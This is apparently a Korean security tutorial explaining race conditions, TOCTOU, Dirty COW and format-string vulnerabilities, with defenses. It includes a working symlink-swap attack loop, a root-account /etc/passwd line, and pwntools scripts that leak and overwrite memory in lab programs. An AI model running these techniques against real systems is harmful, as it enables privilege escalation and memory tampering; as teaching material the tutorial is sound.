## 1. 경쟁 조건 (Race Condition)

### 🔑 기본 개념

#### 프로세스와 스레드란?

먼저 두 가지 용어를 이해해야 합니다.

| 용어 | 설명 | 비유 |
|------|------|------|
| **프로세스 (Process)** | 컴퓨터에서 실행 중인 프로그램 하나 | 카페 건물 자체 |
| **스레드 (Thread)** | 프로세스 안에서 실제로 일을 하는 실행 단위 | 카페 안의 직원 |

> 💡 **쉽게 이해하기**: 카카오톡(프로세스)을 실행하면, 그 안에서 메시지 수신, 알림 발송, 화면 렌더링 등이 동시에 일어납니다. 이 각각의 작업을 처리하는 것이 스레드입니다.

#### 경쟁 조건이란?

**경쟁 조건(Race Condition)** 이란, **두 개 이상의 프로세스(또는 스레드)가 하나의 공유 자원(파일, 메모리, 변수 등)에 동시에 접근하려 할 때 발생하는 오류**입니다.

- CWE 분류: **CWE-362** — 부적절한 동기화를 사용한 공유 자원 동시 실행

---

### 📖 예제로 이해하기

#### 예제 1: 비트 플립 (Bit Flip)

두 프로세스 A, B가 메모리의 같은 비트를 뒤집으려 합니다.  
초기 메모리 값: **0**

---

**✅ 정상 실행 (순서대로 실행될 때)**

```
프로세스 A       메모리
값 읽기    →     0
뒤집기     →     1  ← A가 0을 1로 변경
                      
프로세스 B       메모리
값 읽기    →     1
뒤집기     →     0  ← B가 1을 0으로 변경

최종 결과: 0 (두 번 뒤집혔으므로 원래 값으로 돌아옴 — 정상)
```

---

**⚠️ 경쟁 조건 발생 (동시에 실행될 때)**

```
프로세스 A       프로세스 B       메모리
값 읽기    →                      0  ← A가 0을 읽음
           →     값 읽기          0  ← B도 0을 읽음 (아직 변경 안 됨!)
뒤집기     →                      1  ← A가 1로 변경
           →     뒤집기           1  ← B도 0이라고 생각해서 1로 변경

최종 결과: 1 (두 번 뒤집혔는데 0이 아니라 1 — 비정상!)
```

> 💡 **핵심**: B가 값을 읽을 때 A가 아직 변경하기 전이었기 때문에, B는 이미 바뀐 값이 아닌 **과거 값**을 기준으로 작업합니다. 이로 인해 예상과 다른 결과가 나옵니다.

---

#### 예제 2: 은행 출금 시스템

아래 코드를 봅시다.

```c
void withdraw(unsigned int amount) {
    if (user.balance < amount) {  // (2) 잔액 확인
        return;
    }
    user.cash    += amount;       // (3) 현금 지급
    user.balance -= amount;       // (4) 잔액 차감
}
```

초기 상태: `잔액 = 1,000,000원`, `현금 = 0원`

---

**✅ 정상 실행 (출금 요청 1개)**

```
(1) 출금 요청: 1,000,000원
(2) 잔액 확인: 1,000,000 >= 1,000,000 → 통과
(3) 현금 지급: cash += 1,000,000 → cash = 1,000,000
(4) 잔액 차감: balance -= 1,000,000 → balance = 0

결과: 잔액 0원, 현금 1,000,000원 ✅
```

---

**⚠️ 경쟁 조건 (출금 요청 2개 동시 발생)**

```
A-1: 출금 요청 1,000,000원
B-1: 출금 요청 1,000,000원
A-2: 잔액 확인 → 통과 (아직 잔액 1,000,000원)
B-2: 잔액 확인 → 통과 (A가 아직 차감 안 했으니까!)
A-3: cash += 1,000,000 → cash = 1,000,000
B-3: cash += 1,000,000 → cash = 2,000,000
A-4: balance -= 1,000,000 → balance = 0
B-4: balance -= 1,000,000 → balance = -1,000,000

결과: 잔액 -1,000,000원(!), 현금 2,000,000원 💀
```

> 💡 **실제 이 취약점이 악용된다면?** 공격자가 여러 탭에서 동시에 송금 요청을 보내 돈을 무한 복제하는 해킹이 가능합니다.

### 🕐 TOCTOU 취약점

#### TOCTOU란?

**TOCTOU (Time-Of-Check To Time-Of-Use)** — **확인한 시점**과 **실제 사용하는 시점** 사이에 상태가 바뀌어 발생하는 취약점입니다.

> 💡 **비유**: 편의점에서 재고를 확인(Check)하고 계산대로 걸어가는 동안(Time Gap), 다른 손님이 그 물건을 가져가버렸다면? 정산 시점(Use)에는 이미 없는 물건인데 팔려고 하는 상황과 같습니다.

#### 취약한 코드 예시

```c
int main() {
    char *file = "/tmp/vuln";

    // (1) 확인(Check): /tmp/vuln에 쓰기 권한이 있는가?
    if (access(file, W_OK) == 0) {

        // (2) 사용(Use): /tmp/vuln을 열어서 쓴다
        FILE *fp = fopen(file, "w");
        if (fp) {
            fprintf(fp, "owned\n");
            fclose(fp);
        }
    }
    return 0;
}
```

#### 공격 방법 (심볼릭 링크 활용)

공격자는 별도 프로세스에서 아래 스크립트를 무한 반복 실행합니다.

```bash
while true; do
    rm -f /tmp/vuln
    echo "safe" > /tmp/vuln       # 정상 파일 생성 (권한 확인용)
    rm -f /tmp/vuln
    ln -s /tmp/target /tmp/vuln   # 심볼릭 링크로 교체 (공격용)
done
```

**심볼릭 링크(Symbolic Link)란?**  
바로가기 아이콘과 같습니다. `/tmp/vuln`이 심볼릭 링크이면, `/tmp/vuln`에 쓰면 실제로는 `/tmp/target`에 쓰이게 됩니다.

---

**⚠️ 공격 시나리오**

```
[프로그램]  access("/tmp/vuln")   → 정상 파일 → 권한 확인 통과!
[공격자]    /tmp/vuln을 심볼릭 링크로 교체 ← 이 틈에!
[프로그램]  fopen("/tmp/vuln")    → 이제 /tmp/target을 가리킴
[결과]      /tmp/target에 "owned" 기록됨 → 공격 성공!
```

> 💡 **핵심**: `access()`(확인)와 `fopen()`(사용) 사이의 짧은 시간 동안 파일이 바뀌어 버립니다.

### 🐄 실제 사례: Dirty COW (CVE-2016-5195)

#### 이 취약점이 왜 유명한가?

- 리눅스 커널에서 발견된 **가장 위험한 취약점 중 하나**
- **일반 사용자가 root(관리자) 권한**을 획득할 수 있음
- 리눅스 커널에 **9년간 존재**했던 버그

#### 사전 지식: Copy-On-Write(COW)란?

COW는 메모리를 효율적으로 사용하기 위한 기법입니다.

```
[COW 동작 원리]

① 프로세스 A와 B가 같은 메모리(X, Y)를 공유
   A ──┐
       ├──→ [X]
   B ──┘──→ [Y]

② B가 Y를 수정하려 하면, 그 때서야 복사본 생성
   A ──────→ [Y] (원본)
   B ──────→ [Y의 복사본] (B만의 것)
```

**장점**: 복사하지 않고 공유하다가, 수정할 때만 복사 → 메모리 절약

---

#### Dirty COW 공격 흐름

공격 목표: `/etc/passwd` (읽기 전용 파일)에 root 계정 추가

```
[공격 단계별 설명]

1단계: 읽기 전용 파일(root_file)의 프라이빗 매핑 요청
       → 커널에게 "나만의 복사본으로 접근하겠다"고 요청

2단계: /proc/[PID]/mem을 통해 "moo" 쓰기 요청
       → /proc/[PID]/mem: 프로세스의 가상 메모리를 파일처럼 접근하는 특수 파일

3단계: 커널이 root_file을 확인 → 읽기 전용이라 직접 쓰기 불가
       → COW 메커니즘 작동: 복사본 공간 할당

4단계: 공격자가 madvise(MADV_DONTNEED) 호출
       → 커널에게 "이 복사본 공간 더 이상 필요 없어"라고 알림
       → 커널이 프라이빗 매핑(복사본)을 제거함

5단계: 커널이 혼란에 빠짐
       → "복사본은 없는데, 쓰기 요청은 있고... 원본에 써야겠다!"
       → 읽기 전용인 원본 root_file에 "moo" 기록됨!
```

---

#### 취약점의 핵심 (경쟁 조건)

두 스레드가 동시에 실행됩니다:

```
스레드 1: /proc/self/mem을 통해 계속 쓰기 시도
스레드 2: madvise(MADV_DONTNEED)를 계속 호출

이 두 작업이 엇갈리는 타이밍에:
  → 커널이 COW 복사본을 만들고 → 바로 삭제되고 → 원본에 쓰는
    일이 발생함!
```

**취약한 코드 (`faultin_page` 함수 내부)**:

```c
// 취약한 버전
if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
    *flags &= ~FOLL_WRITE;  // ← 쓰기 권한 확인 플래그를 제거해버림!
    // COW이기 때문에 "어차피 복사본에 쓸 거니까 괜찮아"라고 판단했지만
    // 복사본이 사라진 후에도 이 플래그가 없으면 원본에 쓰게 됨
```

**패치된 코드**:

```c
// 수정된 버전
if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
    *flags |= FOLL_COW;  // ← 쓰기 권한 제거 대신, COW 영역임을 표시
    // 이후 COW 영역임을 인식하고 원본에 쓰지 않도록 처리
```

#### 실제 피해

공격자는 이 취약점으로 `/etc/passwd`에 다음과 같은 줄을 추가합니다:

```
hacker:x:0:0:pwned:/root:/bin/bash
```

→ `hacker`라는 계정이 **root(UID=0)** 권한으로 로그인 가능해짐!

### 🛡️ 경쟁 조건 방어 방법

#### 1. Mutex (뮤텍스 / 상호 배제)

**한 번에 하나의 프로세스/스레드만** 공유 자원에 접근하도록 잠금을 거는 방식입니다.

> 💡 **비유**: 화장실 열쇠가 하나뿐이라, 한 사람이 들어가면 나올 때까지 다른 사람은 기다려야 합니다.

```c
mutex = 1;  // 1 = 사용 가능, 0 = 사용 중

void lock() {
    while (mutex != 1) {
        // mutex가 1이 될 때까지 대기
    }
    mutex = 0;  // 잠금: 다른 프로세스 접근 차단
}

void unlock() {
    mutex = 1;  // 잠금 해제: 다른 프로세스가 접근 가능
}

// 사용 예:
lock();
// ← 이 사이에 공유 자원 접근 (임계 구역)
unlock();
```

---

#### 2. Semaphore (세마포어)

Mutex가 "1개만 허용"이라면, Semaphore는 **N개까지 동시 접근을 허용**합니다.

> 💡 **비유**: 주차장에 100개의 자리가 있을 때, 100대까지는 동시에 주차 가능하고, 101번째 차는 빈 자리가 날 때까지 기다립니다.

```c
int S;  // 세마포어 값 (= 허용 가능한 동시 접근 수)

void P(S) {   // 자원 사용 전 호출 (Wait)
    S--;
    if (S < 0) {
        // 대기 목록에 추가 후 블록
    }
}

void V(S) {   // 자원 사용 후 호출 (Signal)
    S++;
    if (S <= 0) {
        // 대기 중인 프로세스 하나 깨움
    }
}
```

---

#### 3. RWLock (읽기-쓰기 잠금)

- **읽기**: 여러 프로세스가 **동시에** 가능
- **쓰기**: **단 하나**의 프로세스만 가능 (쓰는 동안 읽기도 차단)

> 💡 **비유**: 도서관에서 책을 여러 사람이 동시에 읽을 수는 있지만, 책을 수정하려면 다른 사람이 다 읽기를 마칠 때까지 기다려야 합니다.

```c
int readers = 0;  // 현재 읽고 있는 독자 수
int writer  = 0;  // 현재 쓰고 있는 작성자 수 (0 또는 1)

void read_lock() {
    while (writer != 0) {}  // 쓰기 중이면 대기
    readers++;
}

void read_unlock() { readers--; }

void write_lock() {
    while (writer != 0) {}  // 다른 쓰기 중이면 대기
    writer = 1;
    while (readers != 0) {} // 읽기 중인 독자가 없을 때까지 대기
}

void write_unlock() { writer = 0; }
```

## 2. 포맷 스트링 (Format String)

### 🔑 기본 개념

#### 포맷 스트링이란?

C언어에서 `printf`, `scanf` 같은 함수에 사용되는 **출력/입력 형식 지정 문자열**입니다.

```c
printf("%d", 42);        // 42 출력
printf("%s", "hello");   // hello 출력
printf("%p", ptr);       // 0x7fff1234abcd 같은 주소 출력
```

#### 주요 포맷 지정자 (Format Specifier)

| 지정자 | 의미 | 예시 |
|--------|------|------|
| `%d` | 정수 (10진수) | `printf("%d", 42)` → `42` |
| `%f` | 부동소수점 | `printf("%f", 3.14)` → `3.140000` |
| `%c` | 문자 1개 | `printf("%c", 65)` → `A` |
| `%s` | 문자열 | `printf("%s", "hi")` → `hi` |
| `%p` | 포인터 주소 | `printf("%p", ptr)` → `0x7fff...` |
| `%n` | ⚠️ **지금까지 출력된 글자 수를 메모리에 저장** | 출력 없음, 값 쓰기 |
| `%x` | 정수 (16진수) | `printf("%x", 255)` → `ff` |

> ⚠️ **`%n`은 매우 위험합니다!** 값을 "읽는" 게 아니라 메모리에 "쓰는" 유일한 지정자입니다.

---

#### 포맷 스트링 취약점이 발생하는 이유

**안전한 코드** vs **취약한 코드**:

```c
// ✅ 안전한 코드: 포맷 스트링을 프로그래머가 직접 지정
printf("%s", user_input);

// ❌ 취약한 코드: 사용자 입력을 포맷 스트링으로 직접 사용
printf(user_input);       // ← 사용자가 "%s%p%n" 등을 입력하면?
```

**왜 위험할까?** `printf`는 포맷 스트링을 파싱하면서 `%d`, `%s` 등을 만나면 **인자가 있다고 가정하고 스택에서 값을 읽어옵니다.** 실제 인자가 없어도 스택에서 값을 가져오기 때문에, 스택의 내용이 노출되거나 엉뚱한 주소에 값이 쓰여질 수 있습니다.

---

### 🎯 공격 유형 4가지

#### (1) 프로그램 강제 종료

```c
// 취약한 프로그램
char format[0x100];
scanf("%s", format);
printf(format);        // 사용자 입력을 포맷 스트링으로 사용
```

**공격 입력**: `%s%s%s%s%s%s`

```
printf가 %s를 처리하려면 스택에서 주소를 읽어옴
  → 스택의 값이 유효한 문자열 주소가 아님
  → 잘못된 주소 접근
  → Segmentation fault (강제 종료)
```

> 💡 **활용**: 서버 프로그램에 적용하면 서비스 거부(DoS) 공격이 가능합니다.

---

#### (2) 스택 메모리 누출

**공격 입력**: `%p%p%p%p%p%p%p%p`

```
출력 예시:
0xa/(nil)/0x7fe29c2f0aa0/(nil)/0x55b689ab46b0/0x70252f7025/...
```

**이게 왜 위험할까?**

64비트 시스템에서 `printf`의 인자 전달 순서:

```
1번째 인자 → RDI 레지스터 (포맷 스트링 자체)
2번째 인자 → RSI 레지스터
3번째 인자 → RDX 레지스터
4번째 인자 → RCX 레지스터
5번째 인자 → R8  레지스터
6번째 인자 → R9  레지스터
7번째 인자 → 스택 [RSP]
8번째 인자 → 스택 [RSP+8]
...
```

`%p`를 여러 개 쓰면, 실제로 제공하지 않은 인자 자리에서 **레지스터와 스택의 값을 그대로 읽어서 출력**합니다.

> 💡 **활용**: 스택에는 함수 반환 주소, 카나리(보안 값), 라이브러리 주소 등이 있습니다. 이를 읽으면 ASLR(주소 랜덤화) 같은 보안 기법을 우회할 수 있습니다.

---

#### (3) 특정 메모리 값 읽기

**파라미터 인덱스 지정자**: `%[n]$p`

```c
printf("%2$d, %1$d\n", 1, 2);
// 출력: 2, 1
// %2$d = 2번째 인자를 10진수로 출력
// %1$d = 1번째 인자를 10진수로 출력
```

**공격 아이디어**: "원하는 주소를 스택에 올려놓고, 해당 위치의 인덱스로 `%[n]$s`를 사용하면 그 주소의 내용(문자열)을 읽을 수 있다!"

```
스택 구조 (printf 호출 시):
[RSP]    = format 변수의 내용  ← 여기에 공격자가 직접 쓴 내용
[RSP+8]  = ...
[RSP+16] = ...

공격자의 입력:
format = "%7$s" + "aaaa" + [secret의 주소 8바이트]
          ↑                    ↑
          7번째 인자를        7번째 인자 위치([RSP+8])에
          문자열로 출력       secret 주소를 배치
```

**실제 공격 스크립트 (Python pwntools)**:

```python
from pwn import *

p = process("./프로그램")

# 프로그램이 출력해주는 secret 주소를 읽음
p.recvuntil(b"'secret': ")
addr_secret = int(p.recvline()[:-1], 16)

# 포맷 스트링 구성: 7번째 인자를 문자열로 출력 + 패딩 + secret 주소
fstring  = b"%7$saaaa"       # 길이 8바이트 (8의 배수로 맞춤)
fstring += p64(addr_secret)  # 8번째 인자 위치에 읽을 주소 배치

p.sendline(fstring)
p.interactive()
# 출력: THIS IS SECRET
```

#### (4) 메모리에 값 쓰기

이것이 포맷 스트링 공격의 **가장 강력한 활용**입니다.

**`%n`의 동작 원리**:

```c
int written;
printf("Hello%n", &written);
// "Hello" = 5글자 출력
// written = 5 저장됨
```

**`%[너비]c`로 출력 글자 수 조절**:

```c
printf("%12345c", 'A');  // 'A'를 12345칸에 걸쳐 출력 (앞에 공백 12344개)
// 12345글자 출력됨 → %n을 쓰면 12345가 저장됨
```

**공격 목표**: `secret` 변수에 `12345` 쓰기

```
스택 구성:
[RSP]    = format 문자열 ("%12345c%8$naaaaa")
[RSP+8]  = 다음 문자열
[RSP+16] = &secret (쓰기 대상 주소)

포맷 스트링: "%12345c%8$naaaaa"
  - %12345c: 12345글자 출력
  - %8$n   : 8번째 인자([RSP+16] = &secret) 위치에 지금까지 출력한 글자 수(12345) 저장
  - aaaaa  : 8의 배수 맞춤용 패딩
```

**실제 공격 스크립트 (64비트)**:

```python
from pwn import *

p = process("./프로그램")

p.recvuntil(b"'secret': ")
addr_secret = int(p.recvline()[:-1], 16)

# format[RSP]에 들어갈 문자열 + [RSP+16]에 들어갈 주소
fstring  = b"%12345c%8$naaaaa"  # 16바이트 (정확히 두 칸 차지)
fstring += p64(addr_secret)

p.sendline(fstring)
print(p.recvall())
# 출력: Secret: 12345
```

**32비트 시스템의 경우**:

32비트에서는 모든 인자가 스택으로 전달되므로 더 단순합니다:

```python
# 포맷 스트링을 먼저 쓰고, 바로 주소를 이어붙임
fstring  = p32(addr_secret)   # [ESP+4] = &secret
fstring += b"%12341c%1$n"     # 1번째 인자([ESP+4])에 12345 쓰기, 주소값이 4바이트이므로 12345를 저장하기 위해 12341만큼 입력
```

### 🛡️ 포맷 스트링 공격 방어 방법

#### 1. 입력 값 검증

사용자 입력에서 `%d`, `%s`, `%n` 등 포맷 지정자를 제거하거나 거부합니다.

```c
// 취약한 코드
printf(user_input);

// 안전한 코드
printf("%s", user_input);  // 포맷 스트링을 항상 리터럴로 고정!
```

#### 2. 위험한 함수 점검

포맷 스트링 취약점이 발생할 수 있는 함수들:

| 함수 | 위험 여부 |
|------|-----------|
| `printf(user_input)` | ❌ 위험 |
| `printf("%s", user_input)` | ✅ 안전 |
| `fprintf`, `sprintf`, `snprintf` | 동일하게 적용 |
| `vfprintf`, `vprintf`, `vsprintf` | 동일하게 적용 |
| `syslog` | 동일하게 적용 |

#### 3. GCC 컴파일 옵션

```bash
gcc -Wformat -Wformat-security 소스파일.c
```

이 옵션을 사용하면 아래와 같은 경고가 발생합니다:

```
warning: format not a string literal and no format arguments [-Wformat-security]
    printf(format);
           ^^^^^^
```

> 💡 **FormatGuard**: 런타임에 포맷 스트링 공격을 탐지하는 라이브러리입니다.

| 항목 | 내용 |
|------|------|

### 포맷 스트링 (Format String) 요약

| 공격 유형 | 방법 | 영향 |
|-----------|------|------|
| 프로그램 종료 | `%s` 다수 입력 | 서비스 거부(DoS) |
| 스택 누출 | `%p` 다수 입력 | 메모리 구조 파악, 보안 우회 |
| 값 읽기 | `%[n]$s` + 주소 | 비밀 값 탈취 |
| 값 쓰기 | `%[n]c%[m]$n` + 주소 | 임의 메모리 조작, 코드 실행 |
